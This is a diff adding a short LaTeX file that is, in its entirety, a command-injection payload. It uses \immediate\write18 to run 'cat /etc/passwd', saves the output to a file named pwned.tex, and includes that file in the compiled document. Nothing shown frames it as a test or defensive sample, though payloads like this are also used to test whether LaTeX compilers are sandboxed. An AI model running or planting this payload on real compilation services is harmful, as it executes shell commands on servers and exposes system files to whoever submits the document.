@@ -1,0 +1,6 @@
+% Runs a shell command through \write18 and reads its output.
+\documentclass{article}
+\begin{document}
+\immediate\write18{cat /etc/passwd > pwned.tex}
+\input{pwned}
+\end{document}
